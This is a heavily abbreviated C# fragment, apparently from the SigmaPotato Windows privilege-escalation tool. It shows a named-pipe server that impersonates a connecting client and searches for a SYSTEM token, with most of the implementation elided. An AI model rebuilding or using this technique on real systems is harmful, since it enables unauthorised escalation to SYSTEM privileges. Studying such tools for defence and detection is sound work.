    ...
    public class SigmaPotatoContext
    {
        ...
        protected void PipeServer()
        {
            ...
            try
            {
                ...
                ConsoleWriter.WriteLine("[+] Created Pipe Name: " + serverPipe);
                if (pipeServerHandle != BAD_HANLE)
                {
                    ...
                    if ((isConnect || Marshal.GetLastWin32Error() == ERROR_PIPE_CONNECTED) && IsStart)
                    {
                        ...
                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            ...
                            ConsoleWriter.WriteLine("[+] Impersonated Client: " + systemIdentity.Name);
                            ConsoleWriter.WriteLine("[+] Searching for System Token...");
                            ...
                            ConsoleWriter.WriteLine("[+] Found System Token: " + isFindSystemToken);
                            RevertToSelf();
                        }
                        else
                        {
                            ConsoleWriter.WriteLine($"[-] 'ImpersonateNamedPipeClient' failed. Win32Error: '{Marshal.GetLastWin32Error()}'");
                        }
                    }
                    else
                    {
                ...
                {
                    ConsoleWriter.WriteLine($"[-] CreateNamedPipe fail. Win32Error: '{Marshal.GetLastWin32Error()}'");
                }
            }
            catch (Exception e)
            {
